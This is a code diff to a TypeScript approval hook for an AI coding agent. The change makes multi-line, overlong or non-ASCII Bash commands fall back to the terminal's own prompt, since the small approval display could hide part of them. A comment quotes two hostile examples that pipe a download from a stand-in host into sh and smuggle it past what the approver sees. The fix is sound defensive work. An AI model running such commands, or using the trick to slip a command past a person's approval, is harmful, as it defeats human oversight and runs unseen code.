@@ -3,10 +3,10 @@
  * the dial about the one waiting tool call and prints its answer. It decides nothing by itself: anything it cannot read
  * or hear back prints nothing, and the terminal's own prompt decides.
  *
- * What leaves this process is four fields. The tool input is cut to a one-line summary here, so the rest of it (a file's
- * content, a whole script) never reaches the daemon. No environment variable is sent: Orca puts ORCA_PAIRING_CODE and
- * ORCA_AGENT_SESSION_SPAWN_TOKEN in the same environment. This file runs only in the `harness` command's own process,
- * and spells the three decisions itself rather than importing the core's.
+ * What leaves this process is four fields and a flag. The tool input is cut to a one-line summary here, so the rest of
+ * it (a file's content, a whole script) never reaches the daemon. No environment variable is sent: Orca puts
+ * ORCA_PAIRING_CODE and ORCA_AGENT_SESSION_SPAWN_TOKEN in the same environment. This file runs only in the `harness`
+ * command's own process, and spells the three decisions itself rather than importing the core's.
  */
 import { daemonFetch, localSocketRoute } from '../lib/localTransport.js'
 
@@ -17,6 +17,8 @@ export interface ApprovalBody {
   tool: string
   summary: string
   cwd?: string
+  /** The dial cannot show the command whole: it shows the agent waiting, and the terminal's prompt decides. */
+  terminalOnly?: true
 }
 
 export interface ApproveDeps {
@@ -65,6 +67,17 @@ function cutBytes(text: string, max: number): string {
   return cut
 }
 
+/**
+ * A command the dial cannot show whole, so Allow there would approve what the person never read: more than one line
+ * (`npm test\ncurl evil.sh | sh` reads "npm test"), a line longer than the card holds, or a character outside printable
+ * ASCII, which the dial draws as quoting or spacing that bash takes as a letter (`echo “; curl x | sh; ”` runs curl).
+ */
+function terminalOnly(input: unknown): boolean {
+  const command = isRecord(input) && typeof input.command === 'string' ? input.command : ''
+  const lines = command.split(/[\r\n]/).map((line) => line.trim()).filter(Boolean)
+  return lines.length > 1 || Buffer.byteLength(lines[0] ?? '') > MAX_SUMMARY_BYTES || /[^\x20-\x7e\r\n]/.test(command)
+}
+
 /** The card's one line under "Allow <tool>?": what the tool acts on, or its name when the input does not say. */
 export function approvalSummary(tool: string, input: unknown): string {
   const field = (name: string): string => {
@@ -105,6 +118,7 @@ async function approvalBody(stdin: AsyncIterable<Buffer | string>): Promise<Appr
   return {
     sessionId, tool: tool.slice(0, MAX_TOOL_CHARS), summary: approvalSummary(tool, toolInput),
     ...(typeof cwd === 'string' ? { cwd } : {}),
+    ...(tool === 'Bash' && terminalOnly(toolInput) ? { terminalOnly: true as const } : {}),
   }
 }
 
@@ -113,7 +127,9 @@ export async function runApprove(deps: ApproveDeps): Promise<0> {
   try {
     const body = await approvalBody(deps.stdin)
     if (!body) return 0
-    const output = OUTPUT[await deps.post(body)]
+    const decision = await deps.post(body)
+    // Posted so the dial shows the agent waiting; whatever comes back, the dial never showed the whole command.
+    const output = body.terminalOnly ? '' : OUTPUT[decision]
     if (output) deps.out(output)
   } catch {
     // No decision: the terminal's prompt is still there.
